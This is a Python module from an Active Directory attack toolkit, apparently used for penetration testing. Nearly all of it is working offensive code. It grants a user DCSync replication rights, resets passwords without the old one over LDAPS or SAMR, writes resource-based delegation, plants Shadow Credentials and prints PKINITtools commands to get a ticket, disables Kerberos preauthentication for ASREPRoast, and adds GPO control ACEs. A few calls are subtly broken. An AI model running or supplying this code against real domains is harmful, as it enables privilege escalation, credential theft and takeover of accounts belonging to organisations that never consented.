import ldap3, impacket, random, string
from ldap3.extend.microsoft import addMembersToGroups, modifyPassword, removeMembersFromGroups
from dsinternals.system.Guid import Guid
from dsinternals.common.cryptography.X509Certificate2 import X509Certificate2
from dsinternals.system.DateTime import DateTime
from dsinternals.common.data.hello.KeyCredential import KeyCredential

from impacket.dcerpc.v5 import samr, transport
from impacket.ldap import ldaptypes

import logging

from .exceptions import ResultError, NoResultError, TooManyResultsError
from .utils import createACE, createEmptySD
from .utils import resolvDN, getDefaultNamingContext
from .utils import cryptPassword
from .utils import userAccountControl

LOG = logging.getLogger()
logging.basicConfig(level=logging.DEBUG, format='%(message)s')

def getGroupMembers(conn, identity):
    """
    Return the list of member for a group whose identity is given as parameter
    """
    group_dn = resolvDN(conn, identity)
    conn.search(group_dn, '(objectClass=group)', attributes='member')
    LOG.info(conn.response[0]['attributes']['member'])


def getObjectAttributes(conn, identity):
    """
    Fetch LDAP attributes for the identity (group or user) provided
    """
    dn = resolvDN(conn, identity)
    conn.search(dn, '(objectClass=*)', attributes='*')
    LOG.info(conn.response[0]['attributes'])


def addUser(conn, sAMAccountName, ou=None):
    """
    Add a new user in the LDAP database
    By default the user object is put in the OU Users
    This can be changed with the ou parameter
    """

    # TODO: Check that the user is not already present in AD?
    #user_dn = resolvDN(conn, sAMAccountName)
    #print(user_dn)

    if ou:
        user_dn = f"cn={sAMAccountName},{ou}"
    else:
        naming_context = getDefaultNamingContext(conn)
        user_dn = f"cn={sAMAccountName},cn=Users,{naming_context}"

    LOG.debug(user_dn)
    user_cls = ['top', 'person', 'organizationalPerson', 'user']
    attr = {'objectClass':  user_cls}
    #attr["cn"] = sAMAccountName
    attr["distinguishedName"] = user_dn
    attr["sAMAccountName"] = sAMAccountName
    attr["userAccountControl"] = 544
    # TODO: If ldaps -> directly set the password?
    #password = "cravatterouge!"
    #encoded_password = base64.b64encode(password.encode("utf16-le"))
    #attr["unicodePwd"] = encoded_password
    conn.add(user_dn, attributes=attr)
    LOG.info(conn.result)


def delObject(conn, identity):
    """
    Delete an object (user or group) from the Directory based on the identity provided
    """
    dn = resolvDN(conn, identity)
    LOG.debug(f"Trying to remove {dn}")
    conn.delete(dn)
    LOG.info(f"[+] {dn} has been removed")


def addUserToGroup(conn, member, group):
    """
    Add an object to a group
        member: the user or group to add into the group
        group: the group to add to
    """
    member_dn = resolvDN(conn, member)
    LOG.debug(f"[+] {member} found at {member_dn}")
    group_dn = resolvDN(conn, group)
    LOG.debug(f"[+] {group} found at {group_dn}")
    addMembersToGroups.ad_add_members_to_groups(conn, member_dn, group_dn, raise_error=True)
    LOG.info(f"[+] Adding {member_dn} to {group_dn}")


def getUsersInOu(conn, base_ou):
    """
    List the user present in an organisational unit
    """
    conn.search(base_ou, '(objectClass=user)')
    for entry in conn.response:
        LOG.info(entry['dn'])


def delUserFromGroup(conn, member, group):
    """
    Remove member from group
    """
    member_dn = resolvDN(conn, member)
    group_dn = resolvDN(conn, group)
    removeMembersFromGroups.ad_remove_members_from_groups(conn, member_dn, group_dn, True, raise_error=True)


def addForeignObjectToGroup(conn, user_sid, group_dn):
    """
    Add foreign principals (users or groups), coming from a trusted domain, to a group
    Args: 
        foreign object sid
        group dn in which to add the foreign object
    """
    # https://social.technet.microsoft.com/Forums/en-US/6b7217e1-a197-4e24-9357-351c2d23edfe/ldap-query-to-add-foreignsecurityprincipals-to-a-group?forum=winserverDS
    magic_user_dn = f"<SID={user_sid}>"
    addMembersToGroups.ad_add_members_to_groups(conn, magic_user_dn, group_dn, raise_error=True)


def addDomainSync(conn, identity):
    """
    Give the right to perform DCSync with the user provided (You must have write permission on the domain)
    Args:
        sAMAccountName, DN, GUID or SID of the user
    """
    user_dn = resolvDN(identity)
    # Query for the sid of our target user
    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
    user_sid = conn.entries[0]['objectSid'].raw_values[0]


    # Set SD flags to only query for DACL
    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)

    # print_m('Querying domain security descriptor')
    conn.search(getDefaultNamingContext(conn), '(&(objectCategory=domain))', attributes=['nTSecurityDescriptor'], controls=controls)
    entry = conn.entries[0]

    secDescData = entry['nTSecurityDescriptor'].raw_values[0]

    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)

    # We need "control access" here for the extended attribute
    accesstype = ldaptypes.ACCESS_ALLOWED_OBJECT_ACE.ADS_RIGHT_DS_CONTROL_ACCESS

    # these are the GUIDs of the get-changes and get-changes-all extended attributes
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2', accesstype))
    secDesc['Dacl']['Data'].append(createACE(user_sid, '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2', accesstype))

    dn = entry.entry_dn
    data = secDesc.getData()
    conn.modify(dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)


def changePassword(conn, identity, new_pass):
    """
    Change the target password without knowing the old one using LDAPS
    Args: 
        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
        new password for the target
    """
    target_dn = resolvDN(conn, identity)

    modifyPassword.ad_modify_password(conn, target_dn, new_pass, old_password=None)
    if conn.result['result'] == 0:
        LOG.info('[+] Password changed successfully!')
    else:
        raise ResultError(conn.result)



def rpcChangePassword(domain, username, password, hostname, target, new_pass):
    """
    Change the target password without knowing the old one using RPC instead of LDAPS
    Args: 
        domain for NTLM authentication
        NTLM username of the user with permissions on the target
        NTLM password or hash of the user
        IP or hostname of the DC to make the password change
        sAMAccountName of the target
        new password for the target
    """
    rpctransport = transport.SMBTransport(hostname, filename=r'\samr')

    # TODO: change this ugly shit
    lmhash, nthash = None, None
    try:
        lmhash_maybe, nthash_maybe = password.split(':')
        if 32 == len(lmhash_maybe) == len(nthash_maybe):
            lmhash, nthash = lmhash_maybe, nthash_maybe
            password = None
    except:
        pass

    rpctransport.set_credentials(username, password, domain, lmhash=lmhash, nthash=nthash)
    dce = rpctransport.get_dce_rpc()
    from impacket.dcerpc.v5 import rpcrt
    dce.set_auth_level(rpcrt.RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
    dce.connect()
    dce.bind(samr.MSRPC_UUID_SAMR)

    server_handle = samr.hSamrConnect(dce, hostname + '\x00')['ServerHandle']
    domainSID = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain)['DomainId']
    domain_handle = samr.hSamrOpenDomain(dce, server_handle, domainId=domainSID)['DomainHandle']   
    userRID = samr.hSamrLookupNamesInDomain(dce, domain_handle, (target,))['RelativeIds']['Element'][0]
    opened_user = samr.hSamrOpenUser(dce, domain_handle, userId=userRID)

    req = samr.SamrSetInformationUser2()
    req['UserHandle'] = opened_user['UserHandle']
    req['UserInformationClass'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer'] = samr.SAMPR_USER_INFO_BUFFER()
    req['Buffer']['tag'] = samr.USER_INFORMATION_CLASS.UserInternal5Information
    req['Buffer']['Internal5']['UserPassword'] = cryptPassword(b'SystemLibraryDTC', new_pass)
    req['Buffer']['Internal5']['PasswordExpired'] = 0

    resp = dce.request(req)
    resp.dump()

# TODO: set Require Preauth
# TODO: Add Computer
# TODO: Write GPO DACL

def setRbcd(conn, spn_sid, target_identity):
    """
    Give Resource Based Constraint Delegation (RBCD) on the target to the SPN provided
    Args: 
        object sid of the SPN (Controlled by you)
        sAMAccountName, DN, GUID or SID of the target (You must have DACL write on it)
    """
    target_dn = resolvDN(conn, target_identity)

    entries = conn.search(getDefaultNamingContext(conn), '(sAMAccountName=%s)' % spn_sid, attributes=['objectSid'])
    try:
        spn_sid = conn.entries[0]['objectSid'].raw_values[0]
    except IndexError:
        LOG.error('User not found in LDAP: %s' % spn_sid)

    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['SAMAccountName','objectSid', 'msDS-AllowedToActOnBehalfOfOtherIdentity'])
    targetuser = None
    for entry in conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        targetuser = entry
    if not targetuser:
        LOG.error('Could not query target user properties')
        return
    try:
        sd = ldaptypes.SR_SECURITY_DESCRIPTOR(data=targetuser['raw_attributes']['msDS-AllowedToActOnBehalfOfOtherIdentity'][0])
        LOG.debug('Currently allowed sids:')
        for ace in sd['Dacl'].aces:
            LOG.debug('    %s' % ace['Ace']['Sid'].formatCanonical())
    except IndexError:
        # Create DACL manually
        sd = createEmptySD()
    sd['Dacl'].aces.append(createACE(spn_sid))
    conn.modify(targetuser['dn'], {'msDS-AllowedToActOnBehalfOfOtherIdentity':[ldap3.MODIFY_REPLACE, [sd.getData()]]})
    if conn.result['result'] == 0:
        LOG.info('Delegation rights modified succesfully!')
        LOG.info('%s can now impersonate users on %s via S4U2Proxy', ldaptypes.LDAP_SID(spn_sid).formatCanonical(), target)
    else:
        raise ResultError(conn.result)


def setShadowCredentials(conn, sAMAccountName):
    """
    Allow to authenticate as the user provided using a crafted certificate (Shadow Credentials)
    Args: 
        sAMAccountName, DN, GUID or SID of the target (You must have write permission on it)
    """
    ShadowCredentialsOutfilePath = None
    ShadowCredentialsExportType = 'PEM'
    ShadowCredentialsPFXPassword = None

    target_dn = resolvDN(conn, sAMAccountName)
    LOG.debug("Generating certificate")
    certificate = X509Certificate2(subject=sAMAccountName, keySize=2048, notBefore=(-40 * 365), notAfter=(40 * 365))
    LOG.debug("Certificate generated")
    LOG.debug("Generating KeyCredential")
    keyCredential = KeyCredential.fromX509Certificate2(certificate=certificate, deviceId=Guid(), owner=target_dn, currentTime=DateTime())
    LOG.debug("KeyCredential generated with DeviceID: %s" % keyCredential.DeviceId.toFormatD())
    LOG.debug("KeyCredential: %s" % keyCredential.toDNWithBinary().toString())
    conn.search(target_dn, '(objectClass=*)', search_scope=ldap3.BASE, attributes=['msDS-KeyCredentialLink'])
    results = None
    for entry in conn.response:
        if entry['type'] != 'searchResEntry':
            continue
        results = entry
    if not results:
        LOG.error('Could not query target user properties')
        return
    try:
        new_values = results['raw_attributes']['msDS-KeyCredentialLink'] + [keyCredential.toDNWithBinary().toString()]
        LOG.debug(new_values)
        LOG.debug("Updating the msDS-KeyCredentialLink attribute of %s" % sAMAccountName)
        conn.modify(target_dn, {'msDS-KeyCredentialLink': [ldap3.MODIFY_REPLACE, new_values]})
        if conn.result['result'] == 0:
            LOG.debug("Updated the msDS-KeyCredentialLink attribute of the target object")
            if ShadowCredentialsOutfilePath is None:
                path = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(8))
                LOG.info("No outfile path was provided. The certificate(s) will be store with the filename: %s" % path)
            else:
                path = ShadowCredentialsOutfilePath
            if ShadowCredentialsExportType == "PEM":
                certificate.ExportPEM(path_to_files=path)
                LOG.info("Saved PEM certificate at path: %s" % path + "_cert.pem")
                LOG.info("Saved PEM private key at path: %s" % path + "_priv.pem")
                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                LOG.info("Run the following command to obtain a TGT")
                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pem %s_cert.pem -key-pem %s_priv.pem %s/%s %s.ccache" % (path, path, '<DOMAIN>', sAMAccountName, path))
            elif ShadowCredentialsExportType == "PFX":
                if ShadowCredentialsPFXPassword is None:
                    password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(20))
                    LOG.info("No pass was provided. The certificate will be store with the password: %s" % password)
                else:
                    password = ShadowCredentialsPFXPassword
                certificate.ExportPFX(password=password, path_to_file=path)
                LOG.info("Saved PFX (#PKCS12) certificate & key at path: %s" % path + ".pfx")
                LOG.info("Must be used with password: %s" % password)
                LOG.info("A TGT can now be obtained with https://github.com/dirkjanm/PKINITtools")
                LOG.info("Run the following command to obtain a TGT")
                LOG.info("python3 PKINITtools/gettgtpkinit.py -cert-pfx %s.pfx -pfx-pass %s %s/%s %s.ccache" % (path, password, '<DOMAIN>', sAMAccountName, path))
        else:
            raise ResultError(conn.result)
    except IndexError:
        LOG.error('Attribute msDS-KeyCredentialLink does not exist')
    return

def dontReqPreauth(conn, identity, enable):
    """
    Enable or disable the DONT_REQ_PREAUTH flag for the given user in order to perform ASREPRoast
    You must have a write permission on the UserAccountControl attribute of the target user
    Args:
        sAMAccountName, DN, GUID or SID of the target
        set the flag on the UserAccountControl attribute (default is True)
    """
    UF_DONT_REQUIRE_PREAUTH = 4194304
    userAccountControl(conn, identity, enable, UF_DONT_REQUIRE_PREAUTH)



def accountdisable(conn, identity, enable):
    """
    Enable or disable the target account by setting the ACCOUNTDISABLE flag in the UserAccountControl attribute
    You must have write permission on the UserAccountControl attribute of the target
    Args:
        sAMAccountName, DN, GUID or SID of the target
        set the flag on the UserAccountControl attribute 
    """
    UF_ACCOUNTDISABLE = 2
    userAccountControl(conn, identity, enable, UF_ACCOUNTDISABLE)

def modifyGpoACE(conn, identity, gpo):
    """
    Give permission to a user to modify the GPO
    Args:
        sAMAccountName, DN, GUID or SID of the user
        name of the GPO (ldap name)
    """
    user_dn = resolvDN(conn, identity)
    conn.search(user_dn, '(objectClass=*)', attributes=['objectSid'])
    user_sid = conn.entries[0]['objectSid'].raw_values[0]

    controls = ldap3.protocol.microsoft.security_descriptor_control(sdflags=0x04)
    conn.search(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo, attributes=['nTSecurityDescriptor'], controls=controls)

    if len(conn.entries) <= 0:
        raise NoResultError(getDefaultNamingContext(conn), '(&(objectclass=groupPolicyContainer)(name=%s))' % gpo)
    gpo = conn.entries[0]

    secDescData = gpo['nTSecurityDescriptor'].raw_values[0]
    secDesc = ldaptypes.SR_SECURITY_DESCRIPTOR(data=secDescData)
    newace = createACE(user_sid)
    secDesc['Dacl']['Data'].append(newace)
    data = secDesc.getData()

    conn.modify(gpo.entry_dn, {'nTSecurityDescriptor':(ldap3.MODIFY_REPLACE, [data])}, controls=controls)
    if conn.result["result"] == 0:
        LOG.info('LDAP server claims to have taken the secdescriptor. Have fun')
    else:
        raise ResultError(conn.result)